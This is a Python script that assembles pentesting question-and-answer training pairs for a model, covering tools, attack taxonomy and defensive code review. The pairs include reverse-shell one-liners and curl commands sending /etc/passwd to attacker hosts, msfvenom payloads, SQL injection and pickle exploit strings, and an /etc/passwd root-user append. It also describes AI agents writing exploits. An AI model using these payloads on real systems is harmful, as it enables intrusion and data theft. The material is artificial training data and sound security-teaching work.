#!/usr/bin/env python3
"""Extract cybersecurity training pairs from PentAGI's knowledge base.

Mines PentAGI's Go templates, tool registry, and attack taxonomy to produce
Owen Coder training pairs covering:
  - Pentesting methodology and attack planning
  - Security tool usage (nmap, sqlmap, metasploit, hydra, etc.)
  - Attack taxonomy and vulnerability classification
  - Exploit development patterns
  - Knowledge graph entity relationships
  - Defensive perspective from attacker knowledge

Output: pentagi_training_data.jsonl
"""
import json
import os
import random

random.seed(42)

PAIRS = []

def add(instruction: str, output: str):
    PAIRS.append({"instruction": instruction.strip(), "output": output.strip()})


# ===========================================================================
# SECTION 1: PENETRATION TESTING METHODOLOGY
# ===========================================================================

add(
    "What are the main phases of a penetration test and what happens in each phase?",
    """A penetration test follows these phases:

**1. Reconnaissance (Information Gathering)**
- Passive: OSINT, DNS enumeration, subdomain discovery, public records
- Active: Port scanning (nmap), service enumeration, banner grabbing
- Tools: nmap, amass, subfinder, theharvester, shodan

**2. Vulnerability Assessment**
- Service version identification and CVE mapping
- Web application scanning (directory brute-forcing, parameter fuzzing)
- Configuration analysis and misconfiguration detection
- Tools: nikto, nuclei, sqlmap, gobuster, wpscan

**3. Exploitation**
- Exploiting identified vulnerabilities to gain initial access
- Credential attacks (brute-force, password spraying, hash cracking)
- Web application exploitation (SQLi, XSS, command injection, SSRF)
- Tools: metasploit, hydra, sqlmap, custom exploits

**4. Post-Exploitation**
- Privilege escalation (kernel exploits, sudo misconfig, SUID binaries)
- Lateral movement (credential reuse, pass-the-hash, pivoting)
- Persistence mechanisms (backdoors, scheduled tasks, registry keys)
- Data exfiltration and impact assessment
- Tools: empire, mimikatz, chisel, proxychains

**5. Reporting**
- Document all findings with reproduction steps
- Risk rating (CVSS scoring, business impact)
- Remediation recommendations prioritized by severity
- Executive summary and technical appendix"""
)

add(
    "Explain the difference between passive and active reconnaissance in penetration testing.",
    """**Passive Reconnaissance** gathers information without directly interacting with the target:
- DNS records lookup (whois, dig, host)
- Subdomain enumeration via public sources (amass, subfinder, chaos)
- Google dorking and cached page analysis
- Social media and employee enumeration (theharvester)
- Certificate transparency logs (crt.sh)
- Shodan/Censys for exposed services
- Job postings revealing technology stack

**Active Reconnaissance** directly probes the target:
- Port scanning: `nmap -sV -sC -p- target` (service detection + scripts)
- Banner grabbing: `nc -nv target 80` or `curl -I target`
- Directory/file enumeration: `gobuster dir -u http://target -w wordlist`
- Web crawling: `katana -u http://target -d 3`
- DNS zone transfers: `dig axfr @ns.target domain`

Key distinction: passive recon leaves no logs on the target system, while active recon generates network traffic that IDS/IPS and firewalls can detect. Start with passive to minimize detection risk, then move to active with appropriate scope authorization."""
)

add(
    "How do you approach web application penetration testing systematically?",
    """Systematic web application penetration testing follows this workflow:

**1. Technology Fingerprinting**
```
whatweb http://target
httpx -u http://target -title -tech-detect -status-code
```

**2. Content Discovery**
```
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,asp,html
ffuf -u http://target/FUZZ -w wordlist -mc 200,301,302,403
```

**3. Endpoint & Parameter Mapping**
```
katana -u http://target -d 3 -jc
gau target | sort -u | grep '='
waybackurls target | grep '?'
```

**4. Vulnerability Scanning**
```
nuclei -u http://target -t cves/ -t vulnerabilities/
nikto -host http://target
```

**5. Manual Testing (OWASP Top 10)**
- SQL Injection: `sqlmap -u "http://target/page?id=1" --batch --risk=3 --level=5`
- XSS: Test reflected/stored/DOM-based in all input fields
- Command Injection: Test with `; id`, `| whoami`, `` `id` ``
- Path Traversal: `../../etc/passwd` in file parameters
- SSRF: Test URL parameters with internal addresses
- Authentication: Default credentials, session management, JWT weaknesses
- Access Control: IDOR testing, forced browsing, privilege escalation

**6. Document every finding** with request/response evidence and remediation."""
)

# ===========================================================================
# SECTION 2: SECURITY TOOL USAGE
# ===========================================================================

# --- nmap ---
add(
    "Show me comprehensive nmap scanning techniques for penetration testing.",
    """**Quick Discovery Scan**
```bash
nmap -sn 192.168.1.0/24  # Host discovery only, no port scan
```

**Full TCP Port Scan with Service Detection**
```bash
nmap -sV -sC -p- -oA full_scan target
# -sV: Service version detection
# -sC: Default NSE scripts
# -p-: All 65535 ports
# -oA: Output in all formats
```

**Aggressive Scan (CTF/authorized)**
```bash
nmap -A -T4 --open target
# -A: OS detection + version + scripts + traceroute
# -T4: Aggressive timing
# --open: Only show open ports
```

**UDP Scan (slow but important)**
```bash
nmap -sU --top-ports 100 target
```

**Vulnerability Scanning**
```bash
nmap --script vuln target
nmap --script "smb-vuln-*" target  # SMB-specific vulns
```

**Stealth Scan (IDS evasion)**
```bash
nmap -sS -T2 -f --data-length 50 target
# -sS: SYN scan (half-open)
# -T2: Slow timing
# -f: Fragment packets
```

**Machine-Readable Output** (always use structured output for parsing):
```bash
nmap -sV target -oX scan.xml  # XML for automated parsing
nmap -sV target -oG scan.gnmap  # Greppable format
```

Common mistake: never invent nmap flags. Verify uncertain syntax with `nmap --help` or `man nmap`."""
)

# --- sqlmap ---
add(
    "How do I use sqlmap effectively for SQL injection testing?",
    """**Basic Detection**
```bash
sqlmap -u "http://target/page?id=1" --batch
```

**Deep Testing (higher risk/level for blind SQLi)**
```bash
sqlmap -u "http://target/page?id=1" --batch --risk=3 --level=5
```

**POST Request Testing**
```bash
sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch
```

**Cookie-Based Injection**
```bash
sqlmap -u "http://target/dashboard" --cookie="session=abc123" -p session --batch
```

**Database Enumeration**
```bash
sqlmap -u "http://target/page?id=1" --dbs                # List databases
sqlmap -u "http://target/page?id=1" -D dbname --tables    # List tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump  # Dump table
```

**OS Shell (if stacked queries supported)**
```bash
sqlmap -u "http://target/page?id=1" --os-shell --batch
```

**WAF Bypass with Tamper Scripts**
```bash
sqlmap -u "http://target/page?id=1" --tamper=space2comment,between --batch
```

**Proxy Through Burp**
```bash
sqlmap -u "http://target/page?id=1" --proxy="http://127.0.0.1:8080" --batch
```

Key points:
- Always use `--batch` for non-interactive mode
- Start with default risk/level, increase if no results
- Use `--technique=BEUSTQ` to limit injection types
- Save sessions with `--output-dir` for resumption
- Respect scope — only test parameters you have authorization for"""
)

# --- metasploit ---
add(
    "What are the correct patterns for using Metasploit's msfconsole in automated/scripted penetration testing?",
    """**Critical Rule: Never run msfconsole without -x flag** — it enters interactive mode and hangs.

**Standalone Pattern (recommended for most cases)**
```bash
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit -j; sleep 30; sessions -l; exit"
```
- `-q`: Quiet mode (reduces output tokens)
- All operations in ONE command chain
- Always end with `;exit` to prevent hanging
- `exploit -j` runs as background job
- `sleep N` waits for connections before checking sessions

**Payload Generation with msfvenom**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
```

**Common Mistakes to Avoid**
1. Running bare `msfconsole` without `-x` — hangs indefinitely
2. Forgetting `;exit` — process never terminates
3. Using `exploit/multi/handler` separately when `exploit` already starts one
4. Starting multiple msfconsole instances — each is isolated, can't see other's sessions
5. Not checking port availability: `netstat -tulnp | grep 4444`

**Recovery from Orphaned Processes**
```bash
pkill -f msfconsole
ps aux | grep ruby  # Verify cleanup
netstat -tulnp | grep 4444  # Verify port freed
```

**RPC Daemon Pattern (complex multi-step workflows)**
```bash
# Step 1: Start daemon (detached/background)
msfrpcd -P password -U user -a 127.0.0.1 -p 55553

# Step 2: Connect and exploit
msfconsole -q -x "connect 127.0.0.1:55553 user password; use exploit/...; exploit; exit"

# Step 3: Check results via same daemon
msfconsole -q -x "connect 127.0.0.1:55553 user password; sessions -l; exit"
```"""
)

# --- hydra ---
add(
    "How do I use hydra for credential brute-forcing in authorized penetration tests?",
    """**SSH Brute Force**
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://target -t 4
```

**HTTP POST Form Login**
```bash
hydra -l admin -P wordlist.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 10
```

**FTP Brute Force**
```bash
hydra -L users.txt -P passwords.txt ftp://target
```

**SMB Brute Force**
```bash
hydra -L users.txt -P passwords.txt smb://target
```

**Key Flags**
- `-l user` / `-L users.txt`: Single user / user list
- `-p pass` / `-P wordlist.txt`: Single password / password list
- `-t N`: Number of parallel connections (default 16, reduce for stability)
- `-f`: Stop after first valid credential found
- `-V`: Verbose mode (show each attempt)
- `-o results.txt`: Save results to file

**Common Mistakes**
- Using wrong flag for password (`-p` is password, not port)
- Too many threads (`-t 64`) causing account lockouts or connection drops
- Not verifying the login failure string in HTTP form attacks
- Confusing hydra's HTTP module syntax with other tools

**Rate Limiting**: If target has rate limiting or account lockout:
```bash
hydra -l admin -P wordlist.txt ssh://target -t 1 -W 3
# -t 1: Single thread
# -W 3: 3-second wait between attempts
```"""
)

# --- gobuster ---
add(
    "How should I use gobuster for web content discovery during penetration testing?",
    """**Directory Enumeration**
```bash
gobuster dir -u http://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 50
```

**File Discovery with Extensions**
```bash
gobuster dir -u http://target -w wordlist.txt -x php,txt,html,bak,old,conf -t 30
```

**Subdomain Enumeration**
```bash
gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30
```

**Virtual Host Enumeration**
```bash
gobuster vhost -u http://target -w wordlist.txt -t 30
```

**With Authentication**
```bash
gobuster dir -u http://target -w wordlist.txt -c "session=abc123" -H "Authorization: Bearer token"
```

**Filter Results**
```bash
gobuster dir -u http://target -w wordlist.txt -s 200,204,301,302 -b 404,403
# -s: Show only these status codes
# -b: Exclude these status codes
```

**Output to File**
Use shell redirection (not invented flags):
```bash
gobuster dir -u http://target -w wordlist.txt > results.txt 2>&1
```

**Wordlist Selection**
- Quick scan: `raft-small-directories.txt` (~20K entries)
- Standard: `raft-medium-directories.txt` (~30K entries)
- Thorough: `directory-list-2.3-medium.txt` (~220K entries)
- API endpoints: `api/api-endpoints.txt`"""
)

# ===========================================================================
# SECTION 3: ATTACK TAXONOMY & VULNERABILITY CLASSIFICATION
# ===========================================================================

add(
    "Explain the attack taxonomy used in penetration testing knowledge graphs. How do vulnerability entities relate to hosts, services, and attack techniques?",
    """In a pentest knowledge graph, entities and relationships model the full attack surface:

**Core Entity Types (Nodes)**
- **Host**: A target machine (IP address, hostname, OS)
- **Port**: A network port on a host (number, protocol, state)
- **Service**: Software running on a port (name, version, banner)
- **WebApp**: A web application hosted on a service
- **Endpoint**: A specific URL path or API endpoint
- **Vulnerability**: A security weakness (CVE, CWE type, CVSS score)
- **Misconfiguration**: A security-relevant config issue
- **Credential**: Discovered username/password/hash/key
- **Account**: A user or service account on a system
- **AttackTechnique**: A method used (MITRE ATT&CK mapping)

**Key Relationships (Edges)**
- `Host --HAS_PORT--> Port --RUNS_SERVICE--> Service`
- `Service --HOSTS_APP--> WebApp --HAS_ENDPOINT--> Endpoint`
- `Service --DETECTED_VULNERABILITY--> Vulnerability` (scanner hit, unverified)
- `Service --CONFIRMED_VULNERABILITY--> Vulnerability` (manually validated)
- `Service --HAS_VULNERABILITY--> Vulnerability` (successfully exploited)
- `Host --HAS_MISCONFIGURATION--> Misconfiguration`
- `Account --AUTHENTICATES_TO--> Service`
- `Credential --YIELDED_ACCESS--> Host`
- `Host --ESCALATED_VIA--> Vulnerability` (privilege escalation)
- `Host --PIVOTED_TO--> Host` (lateral movement)

**Vulnerability Lifecycle**
1. DETECTED: Scanner or automated tool flags it
2. CONFIRMED: Manual verification proves exploitability
3. EXPLOITED (HAS_VULNERABILITY): Successfully used to gain access

This progression is critical — static analysis tools like Attestor detect at step 1. Understanding the full lifecycle helps prioritize: a confirmed vulnerability in an internet-facing service with credentials available is far higher risk than a detected vulnerability in an isolated internal system."""
)

add(
    "What is the MITRE ATT&CK framework and how does it map to penetration testing activities?",
    """MITRE ATT&CK is a knowledge base of adversary tactics, techniques, and procedures (TTPs):

**Tactics (the WHY — adversary goals)**
1. **Reconnaissance** (TA0043): Gathering target information
2. **Resource Development** (TA0042): Establishing infrastructure/tools
3. **Initial Access** (TA0001): Getting into the network
4. **Execution** (TA0002): Running adversary-controlled code
5. **Persistence** (TA0003): Maintaining access across restarts
6. **Privilege Escalation** (TA0004): Gaining higher-level permissions
7. **Defense Evasion** (TA0005): Avoiding detection
8. **Credential Access** (TA0006): Stealing credentials
9. **Discovery** (TA0007): Learning about the environment
10. **Lateral Movement** (TA0008): Moving through the network
11. **Collection** (TA0009): Gathering data of interest
12. **Exfiltration** (TA0010): Stealing data out
13. **Impact** (TA0040): Manipulating or destroying systems/data

**Mapping to Pentest Activities**
- Port scanning (nmap) → Reconnaissance + Discovery
- SQL injection exploitation → Initial Access + Credential Access
- Privilege escalation exploit → Privilege Escalation
- Pass-the-hash → Lateral Movement + Credential Access
- Reverse shell → Execution + Command and Control
- Data dump → Collection + Exfiltration

**For Static Analysis / Attestor**: Understanding ATT&CK helps map code vulnerabilities to real-world attack scenarios. A SQL injection finding (CWE-89) maps to Initial Access via T1190 (Exploit Public-Facing Application). This context helps developers understand the real-world impact of code findings."""
)

# ===========================================================================
# SECTION 4: VULNERABILITY TYPES DEEP DIVES (from attacker perspective)
# ===========================================================================

add(
    "From a penetration tester's perspective, how do you exploit SQL injection vulnerabilities?",
    """**Detection Phase**
1. Test parameters with single quotes: `id=1'` — look for SQL errors
2. Boolean-based detection: `id=1 AND 1=1` vs `id=1 AND 1=2`
3. Time-based blind: `id=1; WAITFOR DELAY '0:0:5'` or `id=1 AND SLEEP(5)`
4. Union-based: `id=1 UNION SELECT NULL,NULL--` (add NULLs until column count matches)

**Exploitation Phase**
```sql
-- Database enumeration
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
-- Table enumeration
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--
-- Column enumeration
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
-- Data extraction
' UNION SELECT username,password FROM users--
```

**Automated with sqlmap**
```bash
sqlmap -u "http://target/page?id=1" --batch --dbs
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump --batch
```

**Bypass Techniques**
- WAF bypass: `1'/**/UNION/**/SELECT/**/1,2,3--`
- Case variation: `uNiOn SeLeCt`
- URL encoding: `%27%20UNION%20SELECT`
- Comment injection: `1'/*!UNION*//*!SELECT*/1,2,3--`

**Defense Perspective (what Attestor detects)**
Static analysis catches SQL injection by identifying:
- String concatenation in SQL queries (CWE-89)
- Missing parameterized queries
- User input flowing directly into SQL statements
- f-strings or .format() in database queries

The fix is always parameterized queries:
```python
# VULNERABLE
cursor.execute(f"SELECT * FROM users WHERE id = {user_input}")
# SAFE
cursor.execute("SELECT * FROM users WHERE id = %s", (user_input,))
```"""
)

add(
    "How do penetration testers exploit command injection vulnerabilities?",
    """**Detection Techniques**
Test input fields and parameters with command separators:
```
; id
| whoami
`id`
$(whoami)
&& id
|| id
%0aid    (newline + command)
```

**Exploitation Examples**
```bash
# Basic injection (semicolon separator)
http://target/ping?host=127.0.0.1;cat /etc/passwd

# Pipe-based
http://target/ping?host=127.0.0.1|id

# Backtick substitution
http://target/lookup?domain=`whoami`.attacker.com

# Out-of-band exfiltration
http://target/ping?host=127.0.0.1;curl http://attacker.com/$(cat /etc/passwd|base64)
```

**Blind Command Injection**
When output isn't reflected, use time-based detection:
```
; sleep 5
| sleep 5
`sleep 5`
```

Or out-of-band (OOB) verification:
```
; curl http://attacker-server/proof
; nslookup attacker.com
; wget http://attacker.com/$(whoami)
```

**Reverse Shell (post-confirmation)**
```bash
; bash -i >& /dev/tcp/attacker/4444 0>&1
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Defense Perspective (what Attestor detects)**
Static analysis identifies command injection via CWE-78:
- `os.system()`, `os.popen()` with user input
- `subprocess.call(shell=True)` with concatenated commands
- `exec()`, `eval()` with untrusted data

Fix: Use subprocess with argument lists (no shell=True):
```python
# VULNERABLE
os.system(f"ping {user_input}")
# SAFE
subprocess.run(["ping", "-c", "1", user_input], shell=False)
```"""
)

add(
    "Explain Server-Side Request Forgery (SSRF) from both attacker and defender perspectives.",
    """**Attacker Perspective — Exploitation**

SSRF lets an attacker make the server issue requests to unintended destinations:

**Basic SSRF Detection**
```
# Test for internal network access
url=http://127.0.0.1
url=http://localhost
url=http://[::1]
url=http://169.254.169.254  (cloud metadata)
```

**Cloud Metadata Exploitation**
```
# AWS
url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# GCP
url=http://metadata.google.internal/computeMetadata/v1/
# Azure
url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

**Internal Port Scanning via SSRF**
```
url=http://127.0.0.1:22    → SSH banner
url=http://127.0.0.1:3306  → MySQL
url=http://127.0.0.1:6379  → Redis
url=http://internal-host:8080  → Internal services
```

**SSRF Bypass Techniques**
```
# IP encoding bypasses
url=http://0x7f000001  (hex)
url=http://2130706433  (decimal)
url=http://017700000001  (octal)
url=http://127.1  (shorthand)

# DNS rebinding
url=http://attacker-domain-that-resolves-to-127.0.0.1

# URL parsing confusion
url=http://evil.com@127.0.0.1
url=http://127.0.0.1#@evil.com
```

**Defender Perspective (Attestor detection)**
Static analysis detects SSRF via CWE-918:
- URL parameters passed to HTTP client functions without validation
- `requests.get(user_input)`, `urllib.urlopen(user_input)`, `fetch(user_input)`
- Missing allowlist validation on URLs/hostnames

Fix: Validate URLs against allowlists, block private IP ranges:
```python
import ipaddress
def is_safe_url(url):
    parsed = urllib.parse.urlparse(url)
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
        return ip.is_global  # Blocks private, loopback, link-local
    except (socket.gaierror, ValueError):
        return False
```"""
)

add(
    "How do attackers exploit deserialization vulnerabilities?",
    """**What is Insecure Deserialization?**
When an application deserializes untrusted data, an attacker can manipulate serialized objects to achieve remote code execution, privilege escalation, or data tampering.

**Common Vulnerable Patterns by Language**

**Python (pickle)**
```python
# VULNERABLE — never unpickle untrusted data
import pickle
data = pickle.loads(user_input)  # CWE-502

# Exploit payload
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))
payload = pickle.dumps(Exploit())
```

**Java (ObjectInputStream)**
```java
// VULNERABLE
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();  // CWE-502
```
Known gadget chains: Apache Commons Collections, Spring, Jackson

**PHP (unserialize)**
```php
// VULNERABLE
$data = unserialize($_GET['data']);  // CWE-502
```

**Detection Signs**
- Base64-encoded data in cookies/parameters containing serialized markers
- Python: `\\x80` prefix (pickle protocol)
- Java: `aced0005` hex prefix (Java serialization magic bytes)
- PHP: `O:4:"User":2:{` format
- .NET: `AAEAAAD` base64 prefix

**Tools**
- Java: ysoserial (gadget chain generator)
- PHP: phpggc (PHP gadget chains)
- Python: Direct pickle payload crafting
- .NET: ysoserial.net

**Defense (what Attestor detects)**
- `pickle.loads()` on untrusted input → CWE-502
- `yaml.load()` without `Loader=SafeLoader` → CWE-502
- `unserialize()` in PHP with user input
- `readObject()` in Java without input validation

Fix: Use safe serialization formats (JSON), validate before deserializing, implement allowlists for deserialized classes."""
)

# ===========================================================================
# SECTION 5: PRIVILEGE ESCALATION & POST-EXPLOITATION
# ===========================================================================

add(
    "What are common Linux privilege escalation techniques that penetration testers look for?",
    """**1. SUID/SGID Binaries**
```bash
find / -perm -4000 -type f 2>/dev/null  # Find SUID binaries
find / -perm -2000 -type f 2>/dev/null  # Find SGID binaries
# Check GTFOBins for exploitation: https://gtfobins.github.io/
```

**2. Sudo Misconfigurations**
```bash
sudo -l  # List sudo permissions
# Exploitable: (ALL) NOPASSWD: /usr/bin/vim
# vim can spawn a shell: sudo vim -c ':!bash'
```

**3. Writable /etc/passwd**
```bash
ls -la /etc/passwd
# If writable, add a root user:
echo 'root2:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd
```

**4. Kernel Exploits**
```bash
uname -a  # Get kernel version
# Search for kernel exploits: searchsploit linux kernel <version>
```

**5. Cron Jobs**
```bash
cat /etc/crontab
ls -la /etc/cron.d/
# Look for writable scripts run by root
```

**6. Capabilities**
```bash
getcap -r / 2>/dev/null
# Dangerous: cap_setuid on python3 → python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

**7. Writable PATH Directories**
```bash
echo $PATH
# If a script calls a command without full path and a PATH dir is writable,
# create a malicious version of that command
```

**8. Docker Group Membership**
```bash
id  # Check if user is in docker group
docker run -v /:/mnt --rm -it alpine chroot /mnt sh  # Mount host root
```

**Automated Enumeration**
```bash
# LinPEAS
curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
# LinEnum
./LinEnum.sh -t
```

**Defense**: Attestor can detect some of these patterns in configuration scripts — SUID setting, overly permissive sudo rules, and writable sensitive files."""
)

add(
    "How do attackers perform lateral movement in Windows Active Directory environments?",
    """**Credential Harvesting**
```bash
# Dump credentials from memory (Mimikatz via Impacket)
impacket-secretsdump domain/user:password@target
# LSASS dump
impacket-smbexec domain/user:password@target
```

**Pass-the-Hash (PtH)**
```bash
# Use NTLM hash directly without cracking
impacket-psexec -hashes :NTLM_HASH domain/admin@target
crackmapexec smb targets.txt -u admin -H NTLM_HASH
evil-winrm -i target -u admin -H NTLM_HASH
```

**Kerberos Attacks**
```bash
# Kerberoasting — extract service ticket hashes
impacket-GetUserSPNs domain/user:password -dc-ip DC_IP -request
# AS-REP Roasting — users without pre-auth
impacket-GetNPUsers domain/ -usersfile users.txt -dc-ip DC_IP

# Crack extracted hashes
hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt  # Kerberoast
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt  # AS-REP
```

**BloodHound — Attack Path Mapping**
```bash
bloodhound-python -d domain.local -u user -p pass -c All -ns DC_IP
# Analyze in BloodHound GUI for shortest paths to Domain Admin
```

**Pivoting (network tunneling)**
```bash
# Chisel — port forwarding through compromised host
# On attacker: chisel server -p 8080 --reverse
# On victim: chisel client attacker:8080 R:socks

# Proxychains for routing through SOCKS
proxychains4 nmap -sT -p 445 internal_target
```

**Tools**
- impacket-*: Python Impacket suite (secretsdump, psexec, smbexec, wmiexec)
- evil-winrm: WinRM shell
- crackmapexec/netexec: Network credential testing
- certipy-ad: Active Directory Certificate Services attacks
- responder: LLMNR/NBT-NS poisoning

**Defense**: Static analysis can detect hardcoded domain credentials, insecure LDAP binds, and credential storage patterns in code."""
)

# ===========================================================================
# SECTION 6: DEFENSIVE PERSPECTIVE FROM ATTACKER KNOWLEDGE
# ===========================================================================

add(
    "As a security analyst, what should I look for in code reviews to prevent the vulnerabilities that penetration testers commonly exploit?",
    """Based on real-world penetration testing patterns, prioritize these in code reviews:

**1. Input Validation at Trust Boundaries (Highest Priority)**
- Every external input (HTTP params, headers, cookies, file uploads, API payloads) must be validated
- Check for: SQL injection (CWE-89), XSS (CWE-79), command injection (CWE-78), path traversal (CWE-22)
- Look for: string concatenation in queries, `shell=True`, f-strings in SQL/OS commands

**2. Authentication & Session Management**
- Hardcoded credentials (CWE-798) — pentesters ALWAYS check for these
- Weak password hashing (MD5, SHA1 without salt) — easily crackable
- Session tokens in URLs or logs (CWE-598)
- Missing rate limiting on login endpoints — enables brute-force
- JWT without signature verification or with `none` algorithm

**3. Access Control**
- IDOR vulnerabilities — sequential IDs without ownership checks (CWE-639)
- Missing authorization checks on API endpoints
- Role checks only on frontend, not backend
- Directory traversal in file access (CWE-22)

**4. Serialization**
- `pickle.loads()` on untrusted data (CWE-502) — instant RCE
- `yaml.load()` without SafeLoader
- Java `readObject()` without class filtering

**5. Secrets Management**
- API keys, tokens, passwords in source code (CWE-798)
- Secrets in config files committed to git
- Database connection strings with plaintext passwords
- Private keys in repositories

**6. Server-Side Request Forgery (SSRF)**
- URL parameters passed to HTTP clients without validation (CWE-918)
- Missing allowlists on outbound requests
- Internal service URLs constructible from user input

**7. Error Handling**
- Stack traces exposed to users (CWE-209) — reveals internal paths, versions
- Verbose error messages leaking database structure
- Different error messages for valid vs invalid usernames (user enumeration)

Use static analysis tools like Attestor to automate detection of these patterns across all code changes."""
)

add(
    "What are the most common false positives in static analysis, and how can security tools reduce them?",
    """False positives in static analysis typically fall into these categories:

**1. Sanitized Input Flagged as Vulnerable**
The analyzer sees user input reaching a sink (SQL query, OS command) but misses the sanitization in between:
```python
# False positive: input IS parameterized but analyzer can't trace it
user_id = validate_int(request.args.get('id'))  # Returns int or raises
cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
# Technically safe (int can't inject SQL) but pattern-matched as SQLi
```
**Reduction**: Track taint through sanitizer functions, recognize type-safe conversions.

**2. Dead Code / Unreachable Paths**
Flagging vulnerabilities in code that can never execute:
```python
if False:
    os.system(user_input)  # Dead code
```

**3. Test Code**
Test files often deliberately contain "vulnerable" patterns for testing:
```python
# test_sql_injection.py
def test_sqli_detection():
    code = "cursor.execute(f'SELECT * FROM users WHERE id = {id}')"
    assert detector.finds_sqli(code)
```
**Reduction**: Exclude test directories or weight findings lower in test files.

**4. Intentional Patterns**
Some "vulnerable" patterns are intentional and safe in context:
```python
# Admin CLI tool that requires root access anyway
subprocess.run(args.command, shell=True)  # Intentional — admin tool
```

**5. Framework-Provided Safety**
Modern frameworks handle escaping/parameterization automatically:
```python
# Django ORM — safe by default
User.objects.filter(name=user_input)  # Not SQLi
```

**How DPO Training Helps (Owen Coder's approach)**
DPO alignment training reduces false positives by teaching the model:
- To recognize when input has been sanitized
- To distinguish test code from production code
- To understand framework-level protections
- To assess whether flagged code is actually reachable
- To output "SAFE — no issues found" when code is genuinely clean

This is one of the key advantages of the Owen Coder DPO-aligned model over the base model."""
)

# ===========================================================================
# SECTION 7: KNOWLEDGE GRAPH & ENTITY RELATIONSHIPS
# ===========================================================================

add(
    "How would you model a penetration test engagement as a knowledge graph? What entities and relationships would you track?",
    """A pentest knowledge graph tracks discovered entities and their relationships throughout an engagement:

**Entity Types (Nodes)**
```
Host          — IP address, hostname, OS type/version
Port          — Port number, protocol (TCP/UDP), state (open/closed/filtered)
Service       — Service name, version, banner text
WebApp        — Web application name, technology stack, URL base
Endpoint      — URL path, HTTP method, parameters
Account       — Username, role, privilege level
Vulnerability — CVE ID, CWE type, CVSS score, description
Misconfiguration — Config issue, impact, affected component
Capability    — What an account/service can do
Credential    — Password, hash, key, token (stored securely)
ValidAccess   — Confirmed access to a system/service
PrivChange    — Privilege escalation event
Tool          — Security tool used
ToolExecution — Specific tool run with parameters and results
Artifact      — File, screenshot, log collected during engagement
Evidence      — Proof of exploitation
Attempt       — Failed or successful attack attempt
AttackTechnique — MITRE ATT&CK technique ID and name
```

**Relationship Types (Edges)**
```
Host --HAS_PORT--> Port
Port --RUNS_SERVICE--> Service
Service --HOSTS_APP--> WebApp
WebApp --HAS_ENDPOINT--> Endpoint

# Vulnerability lifecycle
Service --DETECTED_VULNERABILITY--> Vulnerability (scanner found it)
Service --CONFIRMED_VULNERABILITY--> Vulnerability (manually verified)
Service --HAS_VULNERABILITY--> Vulnerability (successfully exploited)

Host --HAS_MISCONFIGURATION--> Misconfiguration
Account --AUTHENTICATES_TO--> Service
Credential --YIELDED_ACCESS--> Host
Host --ESCALATED_VIA--> Vulnerability
Host --PIVOTED_TO--> Host
AttackTechnique --ATTEMPTED_ON--> Service
```

**Example Graph Path**
```
Host(10.0.0.5) --HAS_PORT--> Port(80/TCP)
  --RUNS_SERVICE--> Service(Apache/2.4.49)
    --HOSTS_APP--> WebApp(WordPress 5.8)
      --HAS_ENDPOINT--> Endpoint(/wp-login.php)
    --CONFIRMED_VULNERABILITY--> Vulnerability(CVE-2021-41773)
      --YIELDED_ACCESS--> Host(10.0.0.5)
        --ESCALATED_VIA--> Vulnerability(CVE-2021-4034, PwnKit)
          --PIVOTED_TO--> Host(10.0.0.10, DC)
```

This graph structure enables powerful queries like "find all paths from internet-facing services to domain admin" — similar to what BloodHound does for Active Directory."""
)

# ===========================================================================
# SECTION 8: AGENT COLLABORATION & TEAM PATTERNS
# ===========================================================================

add(
    "How should a security AI agent collaborate with specialist sub-agents for effective penetration testing?",
    """An effective multi-agent security system uses specialist delegation:

**Agent Roles**
1. **Primary Agent (Orchestrator)**: Plans the overall engagement, delegates tasks, tracks progress
2. **Pentester**: Executes security testing — recon, exploitation, post-exploitation
3. **Coder/Developer**: Writes custom exploits, payloads, automation scripts
4. **Searcher/Researcher**: Gathers intelligence — CVE details, exploit code, documentation
5. **Adviser/Mentor**: Provides strategic guidance when agents get stuck
6. **Memorist/Archivist**: Retrieves historical knowledge from past engagements
7. **Installer/Maintainer**: Sets up tools and manages the testing environment

**Delegation Principles**
1. **Attempt independently first** — only delegate when a specialist would be clearly faster
2. **Provide comprehensive context** — include background, objectives, constraints
3. **Evaluate results critically** — don't blindly trust specialist output
4. **Track delegation chains** — avoid circular delegation loops

**Example Workflow**
```
Primary Agent: "Pentest the web app at 10.0.0.5"
  → Pentester: Runs nmap, discovers Apache + WordPress
    → Searcher: "Find CVEs for WordPress 5.8 and Apache 2.4.49"
    → Searcher returns: CVE-2021-41773 (path traversal in Apache 2.4.49)
  → Pentester: Attempts exploit, gets partial access
    → Coder: "Write a Python exploit for CVE-2021-41773 with reverse shell"
